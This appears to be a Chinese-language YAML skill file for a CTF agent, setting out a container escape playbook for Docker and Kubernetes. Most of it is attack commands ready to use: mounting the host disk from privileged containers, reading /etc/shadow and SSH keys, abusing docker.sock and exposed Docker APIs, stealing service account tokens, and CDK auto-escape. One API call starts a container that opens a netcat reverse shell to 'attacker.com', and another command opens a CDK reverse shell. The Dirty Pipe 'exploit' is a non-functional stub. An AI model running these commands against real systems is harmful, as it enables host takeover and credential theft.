name: container_escape
description: 容器逃逸技术 - 涵盖Docker/Kubernetes容器逃逸的完整攻击链，包括特权容器、危险配置、内核漏洞利用等技术
version: "2.0"
author: CTF-Agent Team
tags: [container, docker, kubernetes, escape, privilege-escalation]
priority: high

# 使用场景
scenarios:
  - Docker容器逃逸到宿主机
  - Kubernetes Pod逃逸
  - 容器环境权限提升
  - 云原生安全测试
  - CI/CD管道安全评估

# 核心技术
techniques:
  - 特权容器逃逸: 利用--privileged配置的完整权限
  - 危险挂载逃逸: 挂载宿主机敏感路径
  - 内核漏洞利用: 利用内核提权漏洞(CVE)
  - 容器配置错误: 容器网络、API配置不当
  - Docker API滥用: Docker Daemon API未授权访问
  - CVE利用: 容器相关内核漏洞利用

# 工具列表
tools:
  - cdk: 容器逃逸工具包
  - container-escape-check: 容器逃逸检测
  - deepce: Docker环境探测与逃逸
  - PEAS-ng: 容器权限提升枚举
  - metasploit: MSF容器模块
  - kube-hunter: Kubernetes安全扫描
  - kubectl: K8s命令行工具
  - capsh: Linux Capabilities工具

# 容器环境探测
container_detection:
  - template: |
      # 检测是否在容器内

      # 1. 检查cgroup
      cat /proc/1/cgroup | grep -E "docker|kubepods"

      # 2. 检查容器环境文件
      ls /.dockerenv
      ls /run/.containerenv

      # 3. 检查mount信息
      mount | grep "overlay"

      # 4. 检查hostname模式
      hostname | grep -E "[a-f0-9]{12}"

      # 5. 检查进程树
      ps aux | head -n 5

      # 6. 使用CDK检测
      cdk evaluate --check

# 特权容器逃逸
privileged_escape:
  - technique: |
      # 特权容器拥有完整权限
      # 检查特权模式

      # 1. 检查capabilities
      capsh --print | grep cap_sys_admin

      # 2. 检查设备访问
      ls -la /dev | head

      # 3. 挂载宿主机磁盘
      fdisk -l  # 查找宿主机磁盘
      mkdir /mnt/host
      mount /dev/sda1 /mnt/host  # 挂载宿主机根分区

      # 4. 访问宿主机文件
      cat /mnt/host/etc/shadow
      cat /mnt/host/etc/passwd

      # 5. 通过宿主机执行命令
      chroot /mnt/host /bin/bash
      # 现在在宿主机环境中

      # 6. 持久化
      # 添加SSH密钥或创建用户

  - cdk_exploit: |
      # 使用CDK工具
      cdk run mount-disk

      # 自动检测并逃逸
      cdk auto-escape

# 危险挂载逃逸
dangerous_mount_escape:
  - techniques:
      - docker.sock挂载: |
          # 挂载docker.sock允许创建新容器
          ls -la /var/run/docker.sock

          # 创建特权容器逃逸
          docker run -it -v /:/mnt --privileged ubuntu:latest /bin/bash

          # 或使用curl
          curl --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/containers/create" \
            -H "Content-Type: application/json" \
            -d '{"Image":"alpine","Cmd":["/bin/sh"],"Privileged":true}'

          # 启动容器
          curl --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/containers/<id>/start"

      - 宿主机路径挂载: |
          # 检查敏感路径挂载
          mount | grep -E "/etc|/root|/home|/var"

          # /etc挂载 -> 读取密码/SSH密钥
          cat /mnt/etc/shadow
          cat /mnt/root/.ssh/id_rsa

          # /var挂载 -> Docker数据/日志
          ls /mnt/var/lib/docker

          # proc挂载 -> 内核信息
          cat /mnt/proc/1/root/etc/shadow

      - /proc挂载: |
          # /proc完整挂载危险
          # 访问宿主机进程空间

          # 通过/proc进入宿主机
          ls /proc/1/root
          cat /proc/1/root/etc/shadow

          # 创建namespace切换
          nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Docker Daemon API滥用
docker_api_abuse:
  - detection: |
      # 检测Docker API暴露
      # 默认端口2375/2376

      nmap -p 2375,2376 target.com

      # 检查API访问
      curl http://target.com:2375/version
      curl http://target.com:2375/containers/json

  - exploitation: |
      # 未授权Docker API

      # 1. 列出容器
      curl -s http://target:2375/containers/json | jq

      # 2. 创建特权容器
      curl -X POST "http://target:2375/containers/create" \
        -H "Content-Type: application/json" \
        -d '{"Image":"alpine","Cmd":["nc","attacker.com","4444","-e","/bin/sh"],"Privileged":true}'

      # 3. 启动容器
      curl -X POST "http://target:2375/containers/<id>/start"

      # 4. 或直接执行命令
      curl -X POST "http://target:2375/containers/<id>/exec" \
        -H "Content-Type: application/json" \
        -d '{"Cmd":["/bin/sh","-c","cat /etc/shadow"]}'

      curl -X POST "http://target:2375/exec/<exec_id>/start"

# 内核漏洞利用
kernel_cve_escape:
  - CVE-2022-0847 (Dirty Pipe):
    affected: Linux 5.8 - 5.16
    poc: |
      # Dirty Pipe漏洞
      # 可覆写任意可读文件

      # 检查内核版本
      uname -r

      # 使用POC
      ./dirty_pipe /etc/passwd
      # 覆写passwd添加root用户

  - CVE-2020-14386:
    affected: Linux kernel < 5.9
    poc: |
      # 内核堆溢出
      # 需要特定条件

  - CVE-2019-5736 (runc):
    affected: runc < 1.0-rc6
    poc: |
      # runc容器逃逸
      # 通过覆写runc二进制

      # POC步骤
      # 1. 创建恶意容器
      # 2. 等待宿主机执行docker exec
      # 3. 覆写runc获取宿主机root

      # 使用CDK
      cdk run runc-escape

# CVE-2022-0847 Dirty Pipe
dirty_pipe:
  - template: |
      #!/usr/bin/env python3
      """
      CVE-2022-0847 Dirty Pipe Exploit
      Allows overwriting arbitrary readable files
      """

      import os
      import sys

      def exploit(target_file):
          # 创建恶意管道
          # 利用splice系统调用
          # 覆写目标文件

          poc_code = """
          // C implementation
          int p[2];
          pipe(p);
          splice(0, &off_in, p[1], NULL, 1, 0);
          write(p[0], malicious_data, len);
          splice(p[1], NULL, fd, &off_out, len, 0);
          """

          # 执行编译的exploit
          # ./dirty_pipe target_file offset data

      # 实际利用
      # 覆写/etc/passwd添加root用户
      # 或覆写/etc/shadow修改密码

# Kubernetes Pod逃逸
k8s_pod_escape:
  - hostPath挂载: |
      # 检查Pod挂载配置

      # 检查是否有hostPath挂载
      kubectl get pod <pod-name> -o yaml | grep hostPath

      # 常见危险hostPath
      # - /etc
      # - /root
      # - /var/run/docker.sock
      # - /

      # 利用挂载
      ls /mnt/host/etc/shadow

  - privileged Pod: |
      # 特权Pod拥有完整权限

      # 检查Pod权限
      kubectl get pod <pod-name> -o yaml | grep privileged

      # 特权Pod逃逸方法同Docker

  - Service Account滥用: |
      # Pod默认有Service Account

      # 检查token
      cat /var/run/secrets/kubernetes.io/serviceaccount/token

      # 使用token访问API
      curl -k -H "Authorization: Bearer $token" \
        https://kubernetes.default.svc/api/v1/nodes

      # 创建特权Pod
      curl -k -H "Authorization: Bearer $token" \
        -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods \
        -H "Content-Type: application/json" \
        -d @privileged_pod.json

# 容器Capabilities利用
capabilities_escape:
  - template: |
      # 检查容器Capabilities

      # 查看当前capabilities
      capsh --print

      # 危险Capabilities
      # CAP_SYS_ADMIN - 系统管理权限
      # CAP_SYS_PTRACE - 进程调试
      # CAP_SYS_MODULE - 内核模块加载
      # CAP_NET_RAW - 网络原始套接字
      # CAP_DAC_OVERRIDE - 文件权限绕过
      # CAP_SYS_CHROOT - chroot权限

      # CAP_SYS_ADMIN利用
      # - 挂载文件系统
      # - 创建namespace
      # - 修改内核参数

      # CAP_SYS_PTRACE利用
      # - 调试宿主机进程
      # - 注入代码到宿主机进程

# CDK工具使用
cdk_usage:
  - template: |
      # CDK - Container Penetration Toolkit

      # 1. 环境评估
      cdk evaluate --check

      # 2. 自动逃逸
      cdk auto-escape

      # 3. 特定漏洞利用
      cdk run mount-disk
      cdk run runc-escape
      cdk run dirty-pipe

      # 4. 信息收集
      cdk info k8s
      cdk info aws

      # 5. 反向shell
      cdk nc-reverse <attacker-ip> <port>

# 检测与防御
detection:
  - 容器逃逸检测:
      - 监控特权容器创建
      - 监控异常挂载
      - 监控namespace切换
      - 监控内核漏洞利用

  - 防御建议:
      - 禁用特权容器
      - 限制hostPath挂载
      - 启用AppArmor/SELinux
      - 使用安全上下文
      - 定期更新内核

# 参考资源
references:
  - https://github.com/cdk-team/CDK
  - https://github.com/deepsecurity/deepce
  - https://github.com/genuinetools/container-escape-check
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
  - https://unit42.paloaltonetworks.com/docker-container-escape-methods/